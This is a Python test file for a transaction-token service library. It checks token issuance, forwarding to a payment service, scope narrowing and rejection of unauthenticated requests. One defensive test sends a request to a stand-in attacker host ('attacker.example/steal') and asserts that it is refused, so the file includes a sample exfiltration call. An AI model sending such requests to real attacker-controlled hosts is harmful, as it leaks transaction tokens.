"""Run the client and edge snippets against the real reference TTS, in-process."""

from __future__ import annotations

import json
import os
import time
from collections.abc import AsyncIterator
from dataclasses import dataclass
from pathlib import Path
from types import ModuleType

import httpx
import pytest

from pytrat.core import TXN_TOKEN_HEADER, AuthorizationError, ReasonCode, Scope, SecretToken
from pytrat.core.crypto import private_key_to_pem, sign_compact
from pytrat.core.testing import TestKey, generate_test_key
from pytrat.server import build_components, create_app, parse_settings

IDP = "https://idp.example"
API = "https://api.payments.example"
TRANSFER = {
    "source_account": "account-A",
    "destination_account": "account-B",
    "amount_minor": 10000,
    "currency": "USD",
}


def _secret(path: Path, data: bytes) -> Path:
    descriptor = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
    with os.fdopen(descriptor, "wb") as handle:
        handle.write(data)
    return path


class Router(httpx.AsyncBaseTransport):
    """Sends TTS traffic to the in-process TTS and records what reaches the payment service."""

    def __init__(self, tts: httpx.AsyncBaseTransport) -> None:
        self.tts = tts
        self.received: list[httpx.Request] = []

    async def handle_async_request(self, request: httpx.Request) -> httpx.Response:
        if request.url.host == "tts.payments.internal":
            return await self.tts.handle_async_request(request)
        self.received.append(request)
        return httpx.Response(201, json={"status": "accepted"})


@dataclass
class Lab:
    usage: ModuleType
    router: Router
    http: httpx.AsyncClient
    gateway_pem: Path
    idp: TestKey

    def access_token(self) -> SecretToken:
        now = int(time.time())
        claims = {
            "iss": IDP,
            "aud": API,
            "sub": "user:123",
            "scope": "payments.transfer payments.read",
            "iat": now,
            "exp": now + 600,
            "client_id": "web-app",
        }
        return SecretToken(
            sign_compact(claims, self.idp.private_key, alg="ES256", kid="idp", typ="at+jwt")
        )


@pytest.fixture
async def lab(snippet, tmp_path: Path) -> AsyncIterator[Lab]:
    usage = snippet("client_usage")
    tts_key, idp = generate_test_key("ES256", kid="tts-1"), generate_test_key("ES256", kid="idp")
    gateway = generate_test_key("ES256", kid="api-gateway")
    _secret(tmp_path / "tts.pem", private_key_to_pem(tts_key.private_key))
    gateway_pem = _secret(tmp_path / "gw.pem", private_key_to_pem(gateway.private_key))
    (tmp_path / "idp.json").write_text(json.dumps({"keys": [idp.jwk()]}))
    settings = parse_settings(
        {
            "trust_domain": usage.TRUST_DOMAIN,
            "issuer": usage.TTS,
            "token_endpoint": usage.TOKEN_ENDPOINT,
            "signing_keys": [{"kid": "tts-1", "alg": "ES256", "private_key_path": "tts.pem"}],
            "workloads": [{"id": "api-gateway", "jwks": {"keys": [gateway.jwk()]}}],
            "subject_tokens": {
                "jwt_access_token": [{"issuer": IDP, "jwks_path": "idp.json", "audience": API}]
            },
            "issuance_policy": {
                "workloads": {
                    "api-gateway": {
                        "scopes": ["payments.transfer", "payments.read"],
                        "tctx": {
                            "source_account": "string",
                            "destination_account": "string",
                            "amount_minor": "integer",
                            "currency": "string",
                        },
                        "rctx": {"req_ip": "string", "channel": "string"},
                        "may_replace": True,
                    }
                }
            },
        },
        base_dir=tmp_path,
    )
    router = Router(httpx.ASGITransport(app=create_app(build_components(settings))))
    async with httpx.AsyncClient(transport=router) as http:
        yield Lab(usage, router, http, gateway_pem, idp)


async def test_client_guide_flow(lab: Lab) -> None:
    usage = lab.usage
    verifier, jwks = usage.tts_verifier(lab.http)
    assert await jwks.refresh() is True
    tts = usage.tts_client(verifier, lab.gateway_pem, lab.http)

    token = await usage.start_transfer(tts, lab.access_token(), TRANSFER)
    assert token.claims.tctx == TRANSFER
    assert token.claims.sub == "user:123"
    assert token.claims.scope == Scope.parse("payments.transfer payments.read")

    payments = usage.payments_client(lab.gateway_pem, lab.http)
    response = await usage.forward_transfer(payments, token, TRANSFER)
    assert response.status_code == 201
    sent = lab.router.received[-1]
    assert sent.headers[TXN_TOKEN_HEADER] == token.forwardable.reveal()
    assert "authorization" not in sent.headers
    assert "workload-identity" in sent.headers

    narrowed = await usage.narrow_to_read_only(tts, token)
    assert narrowed.claims.scope == Scope.parse("payments.read")
    assert narrowed.claims.txn == token.claims.txn

    with pytest.raises(AuthorizationError) as widened:
        await tts.replace(narrowed, Scope.parse("payments.transfer"))
    assert widened.value.reason is ReasonCode.REPLACEMENT_WIDENS_AUTHORIZATION

    with pytest.raises(AuthorizationError) as untrusted, usage.bind_transaction(token):
        await payments.post("https://attacker.example/steal")
    assert untrusted.value.reason is ReasonCode.DESTINATION_NOT_TRUSTED


async def test_fastapi_edge_initiates_and_propagates(snippet, lab: Lab) -> None:
    usage = lab.usage
    verifier, jwks = usage.tts_verifier(lab.http)
    await jwks.refresh()
    gateway = snippet("fastapi_edge").create_gateway(
        usage.tts_client(verifier, lab.gateway_pem, lab.http),
        usage.payments_client(lab.gateway_pem, lab.http),
    )
    transport = httpx.ASGITransport(app=gateway)
    async with (
        gateway.router.lifespan_context(gateway),
        httpx.AsyncClient(transport=transport, base_url="https://gateway.internal") as client,
    ):
        bearer = {"Authorization": f"Bearer {lab.access_token().reveal()}"}
        response = await client.post("/transfers", json=TRANSFER, headers=bearer)
        assert response.status_code == 201
        forwarded = lab.router.received[-1]
        assert TXN_TOKEN_HEADER in forwarded.headers
        assert response.json()["transaction_id"]

        anonymous = await client.post("/transfers", json=TRANSFER)
        assert anonymous.status_code == 401
        assert anonymous.json()["reason_code"] == "SUBJECT_TOKEN_INVALID"
